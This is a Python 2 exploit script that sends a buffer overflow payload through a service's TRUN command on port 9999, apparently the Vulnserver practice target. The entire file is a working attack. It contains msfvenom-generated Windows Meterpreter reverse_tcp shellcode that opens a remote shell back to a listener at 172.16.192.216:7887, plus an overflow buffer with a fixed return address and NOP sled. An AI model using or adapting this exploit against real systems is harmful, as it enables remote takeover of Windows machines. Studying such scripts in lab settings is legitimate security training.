#!/usr/bin/python
import socket
from struct import pack

host = '172.16.192.168'
port = 9999
max_size = 5000

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.192.216 LPORT=7887 
# -b "\x00\x21" -a x86 --platform windows -f py -v shellcode

shellcode =  ""
shellcode += "\xb8\x63\x4f\x16\x39\xdb\xc7\xd9\x74\x24\xf4"
shellcode += "\x5b\x29\xc9\xb1\x56\x83\xeb\xfc\x31\x43\x0f"
shellcode += "\x03\x43\x6c\xad\xe3\xc5\x9a\xb3\x0c\x36\x5a"
shellcode += "\xd4\x85\xd3\x6b\xd4\xf2\x90\xdb\xe4\x71\xf4"
shellcode += "\xd7\x8f\xd4\xed\x6c\xfd\xf0\x02\xc5\x48\x27"
shellcode += "\x2c\xd6\xe1\x1b\x2f\x54\xf8\x4f\x8f\x65\x33"
shellcode += "\x82\xce\xa2\x2e\x6f\x82\x7b\x24\xc2\x33\x08"
shellcode += "\x70\xdf\xb8\x42\x94\x67\x5c\x12\x97\x46\xf3"
shellcode += "\x29\xce\x48\xf5\xfe\x7a\xc1\xed\xe3\x47\x9b"
shellcode += "\x86\xd7\x3c\x1a\x4f\x26\xbc\xb1\xae\x87\x4f"
shellcode += "\xcb\xf7\x2f\xb0\xbe\x01\x4c\x4d\xb9\xd5\x2f"
shellcode += "\x89\x4c\xce\x97\x5a\xf6\x2a\x26\x8e\x61\xb8"
shellcode += "\x24\x7b\xe5\xe6\x28\x7a\x2a\x9d\x54\xf7\xcd"
shellcode += "\x72\xdd\x43\xea\x56\x86\x10\x93\xcf\x62\xf6"
shellcode += "\xac\x10\xcd\xa7\x08\x5a\xe3\xbc\x20\x01\x6b"
shellcode += "\x70\x09\xba\x6b\x1e\x1a\xc9\x59\x81\xb0\x45"
shellcode += "\xd1\x4a\x1f\x91\x60\x5c\xa0\x4d\xca\x0d\x5e"
shellcode += "\x6e\x2a\x07\xa5\x3a\x7a\x3f\x0c\x43\x11\xbf"
shellcode += "\xb1\x96\x8f\xb5\x25\xb5\x5f\x0a\x6d\xad\x5d"
shellcode += "\x8a\x90\xe1\xe8\x6c\xfc\xad\xba\x20\xbd\x1d"
shellcode += "\x7a\x91\x55\x74\x75\xce\x46\x77\x5c\x67\xec"
shellcode += "\x98\x08\xdf\x99\x01\x11\xab\x38\xcd\x8c\xd1"
shellcode += "\x7b\x45\x24\x25\x35\xae\x4d\x35\x22\xc9\xad"
shellcode += "\xc5\xb3\x7c\xad\xaf\xb7\xd6\xfa\x47\xba\x0f"
shellcode += "\xcc\xc7\x45\x7a\x4f\x0f\xb9\xfb\x79\x7b\x8c"
shellcode += "\x69\xc5\x13\xf1\x7d\xc5\xe3\xa7\x17\xc5\x8b"
shellcode += "\x1f\x4c\x96\xae\x5f\x59\x8b\x62\xca\x62\xfd"
shellcode += "\xd7\x5d\x0b\x03\x01\xa9\x94\xfc\x64\xa9\xd3"
shellcode += "\x02\xfa\x86\x7b\x6a\x04\x97\x7b\x6a\x6e\x17"
shellcode += "\x2c\x02\x65\x38\xc3\xe2\x86\x93\x8c\x6a\x0c"
shellcode += "\x72\x7e\x0b\x11\x5f\xde\x95\x12\x6c\xfb\x26"
shellcode += "\x68\x1d\xfc\xc7\x8d\x37\x99\xc8\x8d\x37\x9f"
shellcode += "\xf5\x5b\x0e\xd5\x38\x58\x35\xe6\x0f\xfd\x1c"
shellcode += "\x6d\x6f\x51\x5e\xa4"

payload  = "A" * 2003
payload += pack("<L", 0x625011af)
payload += "\x90" * 50
payload += shellcode
payload += "C" * (max_size - len(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)
print "[*] Sending payload of size: {0} chars...".format(len(payload))

s.send("TRUN /.:/" + payload + "\r\n")

s.close()
